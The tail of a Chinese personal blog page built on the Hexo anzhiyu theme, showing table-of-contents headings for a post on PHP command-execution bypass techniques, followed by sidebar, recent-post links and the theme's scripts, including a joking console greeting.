class="toc-text">长度限制为7的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E4%B8%BA5%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">长度限制为5的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E4%B8%BA4%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">长度为4的绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number"></span> <span class="toc-text">无参数命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%95%E8%BF%87-PHP7-3"><span class="toc-number">1.</span> <span class="toc-text">1.请求头绕过(PHP7.3)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP请求标头</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#apache-request-headers"><span class="toc-number">2.</span> <span class="toc-text">apache_request_headers()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%BF%9BRCE-php5-7"><span class="toc-number"></span> <span class="toc-text">利用全局变量进RCE(php5&#x2F;7)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#get-defined-vars"><span class="toc-number">0.1.</span> <span class="toc-text">get_defined_vars()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-php5"><span class="toc-number"></span> <span class="toc-text">利用session(php5)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#session-start"><span class="toc-number">1.</span> <span class="toc-text">session_start()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8scandir-%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number"></span> <span class="toc-text">使用scandir()进行文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number"></span> <span class="toc-text">无字母数字运算绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-number"></span> <span class="toc-text">异或运算</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/%E6%90%ADblog/" title="hexo和github搭配搭建个人blog"><img src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/image-20250405130248468.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo和github搭配搭建个人blog"/></a><div class="content"><a class="title" href="/2025/04/05/%E6%90%ADblog/" title="hexo和github搭配搭建个人blog">hexo和github搭配搭建个人blog</a><time datetime="2025-04-05T13:35:33.780Z" title="发表于 2025-04-05 21:35:33">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="php命令执行"><img src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php命令执行"/></a><div class="content"><a class="title" href="/2025/04/05/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="php命令执行">php命令执行</a><time datetime="2025-04-05T13:22:49.920Z" title="发表于 2025-04-05 21:22:49">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/ctfshow%20web(php%E7%89%B9%E6%80%A7wp)/" title="ctfshow—web php特性 89—150"><img src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/image-20250405130248468.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow—web php特性 89—150"/></a><div class="content"><a class="title" href="/2025/04/05/ctfshow%20web(php%E7%89%B9%E6%80%A7wp)/" title="ctfshow—web php特性 89—150">ctfshow—web php特性 89—150</a><time datetime="2025-04-05T13:15:56.262Z" title="发表于 2025-04-05 21:15:56">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20/" title="php反序列化"><img src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829693941.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化"/></a><div class="content"><a class="title" href="/2025/04/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20/" title="php反序列化">php反序列化</a><time datetime="2025-04-05T13:06:03.497Z" title="发表于 2025-04-05 21:06:03">2025-04-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/04/04/hello%20(copy)/" title="Hexo的建设及踩坑"><img src="https://cdn.jsdelivr.net/gh/txfmk/tx-pic/picture/1743829558352.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hexo的建设及踩坑"/></a><div class="content"><a class="title" href="/2025/04/04/hello%20(copy)/" title="Hexo的建设及踩坑">Hexo的建设及踩坑</a><time datetime="2025-04-04T08:37:41.920Z" title="发表于 2025-04-04 16:37:41">2025-04-04</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2025 By txfmk</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">4</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>1</sup></a><a href="/tags/jQuery/" style="font-size: 0.88rem;">jQuery<sup>1</sup></a><a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">php反序列化<sup>1</sup></a><a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 0.88rem;">php特性<sup>2</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>3</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>1</sup></a><a href="/tags/%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81/" style="font-size: 0.88rem;">表单验证<sup>1</sup></a><a href="/tags/%E8%A1%A8%E6%A0%BC/" style="font-size: 0.88rem;">表格<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="https://cdn.smartcis.cn/npm/hexo-theme-anzhiyu@1.6.14/source/js/utils.js"></script><script src="https://cdn.smartcis.cn/npm/hexo-theme-anzhiyu@1.6.14/source/js/main.js"></script><script src="https://cdn.smartcis.cn/npm/hexo-theme-anzhiyu@1.6.14/source/js/tw_cn.js"></script><script src="https://cdn.smartcis.cn/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.smartcis.cn/npm/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.smartcis.cn/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.smartcis.cn/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("05/04/2025 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2025 By 安知鱼 V1.6.14",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 txfmk 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.smartcis.cn/npm/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.smartcis.cn/npm/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script async data-pjax src="/js/imgloaded.js?1"></script><link rel="stylesheet" href="https://cdn.smartcis.cn/npm/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.smartcis.cn/npm/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.smartcis.cn/npm/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.smartcis.cn/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.smartcis.cn/npm/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
